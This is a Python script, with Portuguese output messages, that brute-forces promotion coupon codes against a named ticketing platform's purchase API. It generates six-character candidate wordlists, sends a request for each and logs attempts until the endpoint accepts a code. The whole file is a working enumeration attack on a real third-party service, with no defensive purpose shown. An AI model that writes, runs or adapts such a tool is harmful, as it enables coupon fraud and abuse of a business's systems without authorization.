import requests
from requests.exceptions import ConnectionError , JSONDecodeError
import itertools
from os import system
from tqdm import trange, tqdm

URL_GET = "https://event-page.svc.sympla.com.br/api/event-bff/purchase/event//promotion/apply?promotionCode=" # URL of endpoint to check the coupon code or other data

def cls():
    system('cls')

def sendRequest(promotionCode: str):
    try:
        r = requests.get(URL_GET + promotionCode)
        return r, r.json()
    except ConnectionError:
        raise ConnectionError('[-] Erro ao conectar ao servidor')
    except JSONDecodeError:
        raise JSONDecodeError('[-] Erro ao decodificar JSON , provavelmente o endpoint está incorreto')

def createWordList(name: str, mode='CHARACTERS_WITH_NUMBERS', length=6) -> list:
    characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    combinations = itertools.combinations(characters, length)
    wordlist = []
    print("\n[!] Criando Wordlist")
    for combo in combinations:
        word = "".join(combo)
        print(word)
        wordlist.append(word)
    print("[!] Wordlist Criada, salvando....")
    with open(f'{name}.txt', 'w') as f:
        for item in wordlist:
            f.write("%s\n" % item)
    return wordlist

def readWordList(file: str) -> list:
    with open(file, 'r') as f:
        wordlist = f.read().splitlines()
    return wordlist

def combination_list(simple_list: list, length=6) -> list:
    comb_words = []
    for word in simple_list:
        chars = list(word)
        comb_words.extend(chars)
    comb = itertools.combinations(comb_words, length)
    comb_wordlist = [''.join(c) for c in comb]
    return comb_wordlist

def run(wordlistName='src/wordlist6.txt') -> None:
    system('title Request Bruteforce')
    cls()
    print('[.] Iniciando Tentativa de Bruteforce')
    if type(wordlistName) == str:
        wordlist = readWordList(wordlistName)
        print(f'  [*] wordlist : {wordlistName}')
    elif type(wordlistName) == list:
        wordlist = wordlistName
        print('  [*] wordlist : Combined Wordlist*')
    else:
        raise TypeError('[-] Tipo de dado inválido')



    file = open('log.txt', 'w')
    pos=1

    # Use trange to create a progress bar
    with trange(len(wordlist), desc='Progresso', unit='palavra') as progress_bar:
        for i in progress_bar:
            item = wordlist[i]
            cupomcode = ''.join(item)
            status, response = sendRequest(cupomcode)
            if status.status_code == 400:
                progress_bar.set_description(f"[-]{cupomcode}")
                file.write(f"Tentativa {pos} de {len(wordlist)} | [-]{cupomcode}\n")
            else:
                print(f"[+]{cupomcode}")
                file.close()
                break

    print('[!] Tentativa Finalizada')
    file.close()

test_words = ['NULLBYTE', '2023']
combined_wordlist = combination_list(test_words, 6)
run(combined_wordlist)
